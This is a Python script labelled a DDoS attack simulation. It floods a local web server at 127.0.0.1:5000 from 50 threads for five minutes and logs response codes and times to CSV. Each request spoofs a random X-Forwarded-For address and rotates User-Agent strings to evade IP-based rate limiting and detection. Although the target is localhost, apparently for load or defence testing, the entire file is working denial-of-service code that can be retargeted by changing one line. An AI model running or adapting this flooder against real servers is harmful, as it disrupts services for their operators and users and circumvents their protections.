import requests
import threading
import random
import time
import logging
import csv
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('attack_log.txt'),
        logging.StreamHandler()
    ]
)

TARGET_URL = "http://127.0.0.1:5000/"
NUM_THREADS = 50
ATTACK_DURATION = 300  # 5 minutes

# Initialize attack log CSV
with open('attack_log.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['timestamp', 'thread_id', 'ip', 'status_code', 'response_time'])

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
    ]
    return random.choice(user_agents)

def log_attack(thread_id, ip, status_code, response_time):
    with open('attack_log.csv', 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            datetime.now().isoformat(),
            thread_id,
            ip,
            status_code,
            response_time
        ])

def attack(thread_id):
    start_time = time.time()
    while time.time() - start_time < ATTACK_DURATION:
        try:
            # Generate random IP for each request
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            headers = {
                "User-Agent": random_user_agent(),
                "X-Forwarded-For": ip
            }
            
            request_start = time.time()
            response = requests.get(TARGET_URL, headers=headers, timeout=2)
            response_time = time.time() - request_start
            
            log_attack(thread_id, ip, response.status_code, response_time)
            logging.info(f"Thread {thread_id} - IP: {ip} - Status: {response.status_code} - Time: {response_time:.2f}s")
            
        except Exception as e:
            logging.error(f"Thread {thread_id} - Request failed: {str(e)}")
            log_attack(thread_id, ip, "ERROR", 0)
        
        # Random delay between requests
        time.sleep(random.uniform(0.1, 0.5))

def main():
    logging.info("Starting DDoS attack simulation")
    threads = []
    
    for i in range(NUM_THREADS):
        t = threading.Thread(target=attack, args=(i,), name=f"AttackThread-{i}")
        t.daemon = True
        threads.append(t)
        t.start()
        logging.info(f"Started attack thread {i}")
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    logging.info("DDoS attack simulation completed")

if __name__ == "__main__":
    main() 